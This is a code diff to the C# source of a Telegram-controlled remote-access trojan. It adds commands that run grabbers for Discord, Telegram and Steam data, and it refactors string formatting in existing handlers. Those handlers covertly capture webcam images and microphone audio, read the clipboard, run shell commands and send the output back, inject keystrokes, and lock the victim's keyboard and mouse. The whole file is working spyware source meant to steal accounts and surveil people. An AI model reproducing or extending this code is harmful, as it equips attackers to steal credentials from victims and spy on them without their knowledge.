@@ -98,6 +98,9 @@ namespace TelegramRAT
                             "\n /GetCookies" +
                             "\n /GetDesktop" +
                             "\n /GetFileZilla" +
+                            "\n /GetDiscord" +
+                            "\n /GetTelegram" +
+                            "\n /GetSteam" +
                             "\n" +
                             "\n💿 CD-ROM:" +
                             "\n /OpenCD" +
@@ -322,7 +325,7 @@ namespace TelegramRAT
                             telegram.sendText("📷 CommandCam loaded!");
                         }
                         // Log
-                        telegram.sendText("📹 Trying create screenshot from camera " + camera);
+                        telegram.sendText($"📹 Trying create screenshot from camera {camera}");
                         // Check if file exists
                         if (File.Exists(filename))
                         {
@@ -333,7 +336,7 @@ namespace TelegramRAT
                         ProcessStartInfo startInfo = new ProcessStartInfo();
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.FileName = commandCamPATH;
-                        startInfo.Arguments = "/filename \"" + filename + "\" /delay " + delay + " /devnum " + camera;
+                        startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
                         process.StartInfo = startInfo;
                         process.Start();
                         process.WaitForExit();
@@ -369,7 +372,7 @@ namespace TelegramRAT
                         string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
                         string filename = "recording.wav";
                         // Log
-                        telegram.sendText("🎧 Listening microphone " + time + " seconds...");
+                        telegram.sendText($"🎧 Listening microphone {time} seconds...");
                         // Check if fmedia.exe file exists
                         if (!File.Exists(fmediaPATH + fmediaFILE))
                         {
@@ -393,7 +396,7 @@ namespace TelegramRAT
                         ProcessStartInfo startInfo = new ProcessStartInfo();
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.FileName = fmediaPATH + fmediaFILE;
-                        startInfo.Arguments = "--record --until=" + time + " -o " + filename;
+                        startInfo.Arguments = $"--record --until={time} -o {filename}";
                         process.StartInfo = startInfo;
                         process.Start();
                         process.WaitForExit();
@@ -463,7 +466,7 @@ namespace TelegramRAT
                 case "CLIPBOARDGET":
                     {
                         string text = Clipboard.GetText();
-                        telegram.sendText("📋 Clipboard content: " + text);
+                        telegram.sendText($"📋 Clipboard content: {text}");
                         break;
                     }
 
@@ -502,7 +505,7 @@ namespace TelegramRAT
                         {
                             process.Kill();
                         }
-                        telegram.sendText("📊 Processes with name " + processName + " stopped");
+                        telegram.sendText($"📊 Processes with name {processName} stopped");
                         break;
                     }
                 // ProcessStart <process>
@@ -534,7 +537,7 @@ namespace TelegramRAT
                             telegram.sendText("⛔ Processes not started!");
                             break;
                         }
-                        telegram.sendText("📊 Processes with name " + processName + " started");
+                        telegram.sendText($"📊 Processes with name {processName} started");
                         break;
                     }
                 // TaskManagerEnable
@@ -699,6 +702,25 @@ namespace TelegramRAT
                         telegram.UploadFile(filename, true);
                         break;
                     }
+                // GetDiscord
+                case "GETDISCORD":
+                    {
+                        DiscordGrabber.get();
+                        break;
+                    }
+                // GetTelegram
+                case "GETTELEGRAM":
+                    {
+                        TelegramGrabber.get();
+                        break;
+                    }
+                // GetSteam
+                case "GETSTEAM":
+                    {
+                        SteamGrabber.get();
+                        break;
+                    }
+
 
                 // OpenCD <letter/none>
                 case "OPENCD":
@@ -708,9 +730,9 @@ namespace TelegramRAT
                         {
                             string driveLetter = args[1];
                             // One
-                            mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter, null, 0, 0);
-                            mciSendStringA("set drive" + driveLetter + " door open", null, 0, 0);
-                            telegram.sendText("💿 CD-ROM OPEN command sent for " + driveLetter + " device");
+                            mciSendStringA($"open {driveLetter}: type CDaudio alias drive{driveLetter}", null, 0, 0);
+                            mciSendStringA($"set drive{driveLetter} door open", null, 0, 0);
+                            telegram.sendText($"💿 CD-ROM OPEN command sent for {driveLetter} device");
                             break;
                         }
                         catch (IndexOutOfRangeException)
@@ -718,8 +740,8 @@ namespace TelegramRAT
                             // All
                             foreach (char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
                             {
-                                mciSendStringA("open " + drive + ": type CDaudio alias drive" + drive, null, 0, 0);
-                                mciSendStringA("set drive" + drive + " door open", null, 0, 0);
+                                mciSendStringA($"open {drive}: type CDaudio alias drive{drive}", null, 0, 0);
+                                mciSendStringA($"set drive{drive} door open", null, 0, 0);
                             }
                             telegram.sendText("💿 CD-ROM OPEN command sent for ALL devices");
                             break;
@@ -733,9 +755,9 @@ namespace TelegramRAT
                         {
                             string driveLetter = args[1];
                             // One
-                            mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter, null, 0, 0);
-                            mciSendStringA("set drive" + driveLetter + " door closed", "", 0, 0);
-                            telegram.sendText("💿 CD-ROM CLOSE command sent for " + driveLetter + " device");
+                            mciSendStringA($"open {driveLetter}: type CDaudio alias drive{driveLetter}", null, 0, 0);
+                            mciSendStringA($"set drive{driveLetter} door closed", "", 0, 0);
+                            telegram.sendText($"💿 CD-ROM CLOSE command sent for {driveLetter} device");
                             break;
                         }
                         catch (IndexOutOfRangeException)
@@ -743,8 +765,8 @@ namespace TelegramRAT
                             // All
                             foreach (char drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray())
                             {
-                                mciSendStringA("open " + drive + ": type CDaudio alias drive" + drive, null, 0, 0);
-                                mciSendStringA("set drive" + drive + " door closed", "", 0, 0);
+                                mciSendStringA($"open {drive}: type CDaudio alias drive{drive}", null, 0, 0);
+                                mciSendStringA($"set drive{drive} door closed", "", 0, 0);
                             }
                             telegram.sendText("💿 CD-ROM CLOSE command sent for ALL devices");
                             break;
@@ -1100,7 +1122,7 @@ namespace TelegramRAT
                         // Get all text
                         text = string.Join(" ", args, 1, args.Length - 1);
                         // Log
-                        telegram.sendText("📢 Speaking text: " + text);
+                        telegram.sendText($"📢 Speaking text: {text}");
                         // Say
                         SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                         synthesizer.Volume = 100;  // 0...100
@@ -1139,7 +1161,7 @@ namespace TelegramRAT
                         else
                             icon = MessageBoxIcon.Information;
                         // Show
-                        telegram.sendText("📢 Opened messagebox with text " + text + " and type " + type);
+                        telegram.sendText($"📢 Opened messagebox with text {text} and type {type}");
                         MessageBox.Show(new Form() { TopMost = true }, text, type.ToUpper(), MessageBoxButtons.YesNoCancel, icon);
 
                         break;
@@ -1187,7 +1209,7 @@ namespace TelegramRAT
                             break;
                         }
                         keys = string.Join(" ", args, 1, args.Length - 1);
-                        telegram.sendText("🔘 Sending keys: " + keys);
+                        telegram.sendText($"🔘 Sending keys: {keys}");
                         SendKeys.SendWait(keys);
                         break;
                     }
@@ -1246,13 +1268,13 @@ namespace TelegramRAT
                         int code = p.ExitCode;
                         p.WaitForExit();
                         telegram.sendText(
-                            "💻 Command output:" +
+                           "💻 Command output:" +
                             "\n[STDOUT]:" +
-                            "\n" + stdout +
+                            $"\n{stdout}" +
                             "\n[STDERR]:" +
-                            "\n" + stderr +
-                            "\n[CODE]: " + code +
-                            "");
+                            $"\n{stderr}" +
+                            $"\n[CODE]: {code}"
+                        );
                         break;
                     }
 
@@ -1334,7 +1356,7 @@ namespace TelegramRAT
                         // Set
                         utils.AudioVolumeSet(volume);
                         // Response
-                        telegram.sendText("🔊 Audio volume set to " + volume + "%");
+                        telegram.sendText($"🔊 Audio volume set to {volume}%");
                         break;
                     }
                 // AudioVolumeGet
@@ -1346,7 +1368,7 @@ namespace TelegramRAT
                         // Get
                         double volume = utils.AudioVolumeGet();
                         // Response
-                        telegram.sendText("🔊 Audio volume is " + volume + "%");
+                        telegram.sendText($"🔊 Audio volume is {volume}%");
                         break;
                     }
 
@@ -1395,7 +1417,7 @@ namespace TelegramRAT
                             break;
                         }
                         // Block
-                        telegram.sendText("🚧 Keyboard and mouse locked for " + time + " seconds");
+                        telegram.sendText($"🚧 Keyboard and mouse locked for {time} seconds");
                         BlockInput(true);
                         Thread.Sleep(Int32.Parse(time) * 1000);
                         BlockInput(false);
@@ -1426,7 +1448,7 @@ namespace TelegramRAT
                         {
                             SendMessage((IntPtr)0xFFFF, 0x112, (IntPtr)0xF170, (IntPtr)(-1));
                         }
-                        telegram.sendText("📟 Monitor mode: " + state + " set");
+                        telegram.sendText($"📟 Monitor mode: {state} set");
                         break;
                     }
                 // DisplayRotate <0,90,180,270>
